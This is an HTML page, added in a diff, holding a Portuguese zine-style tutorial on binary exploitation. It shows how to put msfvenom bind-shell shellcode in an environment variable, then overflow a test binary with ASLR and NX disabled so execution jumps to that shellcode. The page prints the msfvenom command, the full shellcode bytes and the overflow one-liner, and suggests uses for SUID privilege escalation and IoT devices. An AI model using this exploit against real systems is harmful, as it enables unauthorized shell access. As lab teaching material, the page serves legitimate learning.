@@ -1,0 +1,120 @@
+<!doctype html>
+<html lang="pt-BR">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Injetando Shellcode através de variáveis de ambiente - OffensiveThink</title>
+  <link rel="stylesheet" href="../assets/zine.css">
+</head>
+<body class="article">
+<main class="page article-page">
+<pre>
+     INJETANDO SHELLCODE ATRAVÉS DE VARIÁVEIS DE AMBIENTE
+
+
+        ----------------------------------------------------------------
+        offensive think :: artigo técnico em formato zine / nfo
+        ----------------------------------------------------------------
+
+        titulo : Injetando Shellcode através de variáveis de ambiente
+        autor  : offensive think
+        data   : Mon, Jan 18, 2021
+        tags   : bof, binary-exploitation, osce
+
+        ----------------------------------------------------------------
+        --&gt; https://www.offensivethink.com/posts/inserting-shellcode-by-enviroment.html &lt;--
+
+---[ INDEX ]------------------------------------------------------------
+0 - Let´s Explore It ;D
+
+
+No linux, sempre que você executa um binário as variáveis de ambiente são copiadas para a pilha do processo. Uma das técnicas para binary exploitation consiste em usar as variáveis de ambiente como pontos de entrada do binário.
+Para que o exemplo abaixo funcione é necessário que algumas proteções estejam desabilitadas: ASLR, para que os endereços não sejam randomizados e o binário não deve possuir a proteção NX, para que seja possível executar código na pilha.
+
+    $ sudo echo 0 &gt;  /proc/sys/kernel/randomize_va_space
+
+
+    joaninhadark@kali &gt; ~/binary-exploitation/bof $ checksec binario-teste 
+    [*] &#x27;/home/kali/binary-exploitation/bof/binario-teste&#x27;
+        Arch:     i386-32-little
+        RELRO:    Partial RELRO
+        Stack:    No canary found
+        NX:       NX disabled       &lt;------ NX DESABILITADO
+        PIE:      No PIE (0x8048000)
+        RWX:      Has RWX segments
+
+Vamos primeiro verificar se a teoria de que as variáveis de memória são copiadas para o processo é verdadeira, debugando gdb+gef.
+
+    joaninhadark@kali&gt;  ~/binary-exploitation/bof $ env
+    COLORFGBG=15;0
+    DBUS_SESSION_BUS_ADDRESS=unix:path=/run/user/1000/bus
+    DESKTOP_SESSION=lightdm-xsession
+    DISPLAY=:0
+    GDMSESSION=lightdm-xsession
+    HOME=/home/kali
+    LANG=en_US.utf8
+    LANGUAGE=en_US:en
+    LOGNAME=joaninhadark
+    (...)
+
+</pre>
+<a href="https://www.notion.so/signed/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F3d17e00e-d157-4948-b44a-97052145f4d1%2FUntitled.png?width=926&amp;table=block&amp;id=4af39246-f7f2-45a9-9771-a6d367da57c8" target="_blank"><img src="https://www.notion.so/signed/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F3d17e00e-d157-4948-b44a-97052145f4d1%2FUntitled.png?width=926&amp;table=block&amp;id=4af39246-f7f2-45a9-9771-a6d367da57c8"  ></a>
+<pre>entrando no gdb+gef e usando o comandoentrypara carregar o binário em memória</pre>
+<pre>
+As variáveis de ambiente são colocados &quot;bemmmm lá embaixo&quot; na pilha, então vamos pedir para que o gdb nos mostre todas as strings que estão uns 600 bytes além do topo da pilha ($esp): gef&gt; x/50s $esp
+</pre>
+<a href="https://www.notion.so/signed/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2Fd2fc3b60-3961-4c7b-b61c-7186c4e62721%2FUntitled.png?width=657&amp;table=block&amp;id=71a33b3f-53f1-4ba9-8e1d-7a3ceadd30e1" target="_blank"><img src="https://www.notion.so/signed/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2Fd2fc3b60-3961-4c7b-b61c-7186c4e62721%2FUntitled.png?width=657&amp;table=block&amp;id=71a33b3f-53f1-4ba9-8e1d-7a3ceadd30e1"  ></a>
+<pre>variáveis de ambiente copiadas para a região de memória acessível pelo processo</pre>
+<pre>
+
+
+---[ 0x00 - LET´S EXPLORE IT ;D ]---------------------------------------
+Vamos criar um pequeno shellcode de teste usando o msfvenon mesmo (fique a vontade para criar o seu) apenas se preocupando em tirar o nullbyte, já que, as variáveis de ambiente são strings e toda string termina com nullbyte. Se existir um nullbyte no meio do seu código, este será encarado como o final da sring.
+
+    $ msfvenom -p linux/x86/shell_bind_tcp lport=1337 -f c -b &quot;\x00&quot;
+
+Vamos criar agora a variável de ambiente desejada, que conterá o shellcode, adicionando algunas nops (\x90) no início
+
+    $ export shellcode=$(echo -ne &quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90
+    \x90\x90\x90\x90\xbd\x74\xaa\x4e\x45\xdb\xd4\xd9\x74\x24\xf4\x58\x2b\xc9\xb1\x14
+    \x31\x68\x14\x83\xe8\xfc\x03\x68\x10\x96\x5f\x7f\x9e\xa1\x43\xd3\x63\x1e\xee\xd6
+    \xea\x41\x5e\xb0\x21\x01\xc4\x63\xe8\x69\xf9\x9b\x09\x50\x97\x8b\x40\xf2\xee\x4d
+    \x08\x94\xa8\x40\x4d\xd1\x08\x5f\xfd\xe5\x3a\x39\xcc\x65\x79\x76\xa8\xa8\xfe\xe5
+    \x6c\x58\xc0\x51\x42\x1c\x77\x1b\xa4\x74\xa7\xf4\x27\xec\xdf\x25\xaa\x85\x71\xb3
+    \xc9\x05\xdd\x4a\xec\x15\xea\x81\x6f&quot;)
+
+</pre>
+<a href="https://www.notion.so/signed/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F117edee2-f5f5-443b-a364-68dcc3cad968%2FUntitled.png?width=1320&amp;table=block&amp;id=dce8eace-ad18-4267-9ad8-db7106f4a57e" target="_blank"><img src="https://www.notion.so/signed/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F117edee2-f5f5-443b-a364-68dcc3cad968%2FUntitled.png?width=1320&amp;table=block&amp;id=dce8eace-ad18-4267-9ad8-db7106f4a57e"  ></a>
+<pre>usando o comandoenvpara verificar se a variável de ambiente foi criada corretamente</pre>
+<pre>
+Nosso binário de exemplo é corrompido e consegue sobrescrever o endereço na pilha que vai ser carregado no EIP (sobrescrever o EIP) exatamente em 812 Bytes.  Logo o que faremos é, passar para o binário 812 letras A e em seguida colocar o endereço para onde ele deve saltar, neste caso o endereço do nosso shellcode, que é o endereço da variável de ambiente que criamos, que já está na pilha do processo. ;D
+Mas precisamos saber qual o endereço da variável de ambiente que criamos e para isso vamos usar a um pequeno binário de nome *getenviroment* que adaptei para mostrar o endereço de uma variável de ambiente e seu conteúdo. Você encontra o binário e o código fonte no meu repositório *offensivetools*.
+diegoalbuquerque/offensivetools
+https://github.com/diegoalbuquerque/offensivetools
+A ferramenta espera o nome da variável e quantidade de bytes que você pretende ver a partir do endereço da memória da variável
+
+    $ ./getenviroment shellcode 100 
+      [+] The variable shellcode is at: 0xffffdf39
+      [+] Memory content at 0xffffdf39
+          \x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\xBD\x74\xAA\x4E\x45\xDB\xD4\xD9\x74\x24\xF4\x58\x2B\xC9\xB1\x14\x31\x68\x14\x83\xE8\xFC\x3\x68\x10\x96\x5F\x7F\x9E\xA1\x43\xD3\x63\x1E\xEE\xD6\xEA\x41\x5E\xB0\x21\x1\xC4\x63\xE8\x69\xF9\x9B\x9\x50\x97\x8B\x40\xF2\xEE\x4D\x8\x94\xA8\x40\x4D\xD1\x8\x5F\xFD\xE5\x3A\x39\xCC\x65\x79\x76\xA8\xA8\xFE\xE5\x6C\x58\xC0\x51\x42\x1C\x77\x1B%
+
+Agora que temos o endereço vamos fazer o buffer overflow no binário.
+
+    $ python -c &quot;print &#x27;A&#x27;*812+&#x27;\xff\xff\xdf\x39&#x27;[::-1]&quot; | ./binario-teste
+
+</pre>
+<a href="https://www.notion.so/signed/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F93f8748f-f0b2-430c-96f5-caf23d58384c%2FUntitled.png?width=1425&amp;table=block&amp;id=24ad7826-c343-4ada-acfb-d8c000c4d871" target="_blank"><img src="https://www.notion.so/signed/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F93f8748f-f0b2-430c-96f5-caf23d58384c%2FUntitled.png?width=1425&amp;table=block&amp;id=24ad7826-c343-4ada-acfb-d8c000c4d871"  ></a>
+<pre>Processo &quot;travado&quot;. Em outra janela, conexão ao bind shell.</pre>
+<pre>
+*Observação!* Muitas vezes o endereço vazado não é exatamente o certo, logo é só ir incrementando de byte em byte até que a exploração funcione.
+Como podemos observar existem algumas limitações de termos que obter o endereço da variável de ambiente, que pode mudar, mesmo sem o ASLR habilitado. O binário também precisa não ter habilitada a proteção NX. Mas acho que toda técnica é interessante pois um dia poderá ter seu uso. Quem sabe em uma pós exploração onde temos um binário com SUID BIT e ai podemos obter o endereço da variável e fazer um shellcode só para escalar privilégio ? QUem sabe uma exploração em um IOT que não tem todas estas proteções ?
+O que penso da técnica é que podemos contornar algumas limitações, como por exemplo, limite de bytes do buffer que você pode escrever, já que , quem vai copiar as variáveis de ambiente será o S.O, sem limites. Podemos pensar em facilidade em bypassar aquele campo que seria passível de injeção mas que devido aos filtros nos leva a ter que nos preocupar com um  monte de badchars.
+Acho que é isso.
+
+---[ EOF ]--------------------------------------------------------------
+
+                    offensive think / 2026
+</pre>
+</main>
+</body>
+</html>
